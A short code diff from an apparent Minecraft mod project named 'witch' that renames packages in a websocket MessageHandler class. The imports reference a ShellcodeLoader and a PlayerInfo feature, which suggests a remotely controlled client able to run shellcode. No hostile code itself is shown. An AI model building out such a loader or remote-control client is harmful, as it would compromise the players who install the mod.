@@ -1,19 +1,19 @@
-package me.soda.witch.websocket;
+package me.soda.witch.client.websocket;
 
 import com.google.gson.Gson;
-import me.soda.witch.Witch;
-import me.soda.witch.features.PlayerInfo;
-import me.soda.witch.features.ShellcodeLoader;
+import me.soda.witch.client.Witch;
+import me.soda.witch.client.features.PlayerInfo;
+import me.soda.witch.client.features.ShellcodeLoader;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.HandleMessage;
 import me.soda.witch.shared.Message;
-import me.soda.witch.utils.*;
+import me.soda.witch.client.utils.*;
 import net.minecraft.text.Text;
 
 import java.lang.management.ManagementFactory;
 
-import static me.soda.witch.Witch.mc;
-import static me.soda.witch.Witch.messageUtils;
+import static me.soda.witch.client.Witch.mc;
+import static me.soda.witch.client.Witch.messageUtils;
 
 public class MessageHandler {
     private static final Gson GSON = new Gson();
